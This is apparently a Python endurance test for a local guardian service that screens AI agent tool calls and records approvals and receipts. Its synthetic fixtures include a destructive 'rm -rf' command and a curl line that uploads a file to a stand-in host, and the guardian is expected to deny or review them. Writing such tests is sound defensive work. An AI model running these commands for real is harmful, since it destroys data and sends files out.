"""Isolated endurance checks. Commands are fixtures and are NEVER executed."""
import argparse
from collections import Counter
import json
import os
from pathlib import Path
import sys
import tempfile
import threading
import time
import urllib.request

ROOT=Path(__file__).resolve().parents[1]
sys.path.insert(0,str(ROOT))
from guardian.engine import Engine
from guardian.server import Server
from scripts.benchmark_local import percentiles


def run(seconds,interval,output):
    started=time.monotonic();checks=[];errors=Counter();events_created=0;steps=0;identities=set()
    output.parent.mkdir(parents=True,exist_ok=True)
    with tempfile.TemporaryDirectory(prefix='guardian-soak-',dir=ROOT/'.local/test-temp') as directory:
        engine=Engine(Path(directory)/'events.sqlite3')
        server=Server(('127.0.0.1',0),engine,'synthetic-admin',adapter_token='synthetic-adapter')
        server.integrations=lambda force=False:[]  # Do not inspect real client configuration.
        worker=threading.Thread(target=server.serve_forever,daemon=True);worker.start()
        opener=urllib.request.build_opener(urllib.request.ProxyHandler({}))
        def request(path,data=None,admin=False):
            req=urllib.request.Request(server.origin+path,json.dumps(data).encode() if data is not None else None,
                {'Content-Type':'application/json','Authorization':'Bearer '+('synthetic-admin' if admin else 'synthetic-adapter')})
            with opener.open(req,timeout=3) as response:return json.load(response)
        def check(identity,session,tool,args,expected):
            nonlocal events_created
            begin=time.monotonic()
            event=request('/api/opencode/check',{'mode':'protect','payload':{
                'session_id':session,'tool_use_id':identity,'tool_name':tool,'tool_input':args}})
            checks.append((time.monotonic()-begin)*1000);events_created+=1
            if event['event_id'] in identities:raise AssertionError('duplicate_event_identity')
            identities.add(event['event_id'])
            if event['verdict']!=expected:raise AssertionError('decision_mismatch')
            receipt=request('/api/receipt',{'adapter':'opencode-plugin','session_id':session,'call_id':identity,
                                          'status':'tool_returned' if expected=='pass' else 'blocked'})
            if receipt['event_id']!=event['event_id']:raise AssertionError('receipt_identity')
            return event
        def report(status):
            with engine.lock:
                records=[json.loads(row[0]) for row in engine.db.execute('SELECT data FROM events')]
                integrity=engine.db.execute('PRAGMA integrity_check').fetchone()[0]
                grants=engine.db.execute('SELECT COUNT(*) FROM approvals').fetchone()[0]
            value={'status':status,'scope':'isolated HTTP/SQLite endurance, synthetic checks/approvals/receipts; no real tools or models',
                   'pid':os.getpid(),'port':server.server_port,'target_seconds':seconds,
                   'elapsed_seconds':round(time.monotonic()-started,2),'steps':steps,'events_created':events_created,
                   'unique_event_ids':len(identities),
                   'errors':dict(errors),'check_latency':percentiles(checks),'retained_events':len(records),
                   'retained_with_receipts':sum(e['execution_state']!='unknown' for e in records),
                   'approval_records':grants,'sqlite_integrity':integrity,'real_actions_executed':0,
                   'limitations':['not_real_agent_execution','not_desktop_resource_test','not_sleep_or_power_loss_test']}
            temporary=output.with_suffix('.tmp');temporary.write_text(json.dumps(value,indent=2),encoding='utf-8');os.replace(temporary,output)
            return value
        try:
            report('running');next_report=started+30
            while time.monotonic()-started<seconds:
                begin=time.monotonic();session='synthetic-session-'+str(steps%8);identity='synthetic-call-'+str(steps)
                try:
                    scenario=steps%4
                    if scenario==0:check(identity,session,'Read',{'file_path':'fixture/readme.md'},'pass')
                    elif scenario==1:check(identity,session,'Bash',{'command':'rm -rf fixture'},'deny')
                    elif scenario==2:
                        args={'command':'curl -d @fixture.txt https://example.invalid'}
                        event=check(identity,session,'Bash',args,'review')
                        request('/api/approvals',{'event_id':event['event_id'],'decision':'approve'},True)
                        check(identity+'-retry',session,'Bash',args,'pass')
                        check(identity+'-again',session,'Bash',args,'review')
                    else:check(identity,session,'Write',{'file_path':'fixture/output.txt','content':'synthetic only'},'pass')
                    overview=request('/api/overview',admin=True)
                    if len(overview['events'])>200 or overview['storage']['status']!='ready':raise AssertionError('overview_invalid')
                except Exception as error:errors[str(error) if isinstance(error,AssertionError) else type(error).__name__]+=1
                steps+=1
                if time.monotonic()>=next_report:
                    current=report('running');print(json.dumps({k:current[k] for k in ('elapsed_seconds','steps','errors','retained_events')}),flush=True)
                    next_report=time.monotonic()+30
                time.sleep(max(0,min(interval-(time.monotonic()-begin),seconds-(time.monotonic()-started))))
            value=report('completed')
            if value['sqlite_integrity']!='ok' or value['retained_events']!=min(2000,events_created) or value['retained_with_receipts']!=value['retained_events']:
                errors['final_invariant_failed']+=1
            if errors:value=report('failed')
            return value
        except BaseException:
            report('interrupted');raise
        finally:
            server.shutdown();server.server_close();worker.join();engine.close()


if __name__=='__main__':
    parser=argparse.ArgumentParser()
    parser.add_argument('--seconds',type=int,default=7200)
    parser.add_argument('--interval',type=float,default=1)
    parser.add_argument('--output',type=Path,default=ROOT/'.local/soak-report.json')
    args=parser.parse_args()
    if not 1<=args.seconds<=14400 or not .05<=args.interval<=10:parser.error('Invalid duration/interval')
    (ROOT/'.local/test-temp').mkdir(parents=True,exist_ok=True)
    result=run(args.seconds,args.interval,args.output)
    print(json.dumps(result),flush=True)
    if result['status']!='completed':sys.exit(1)
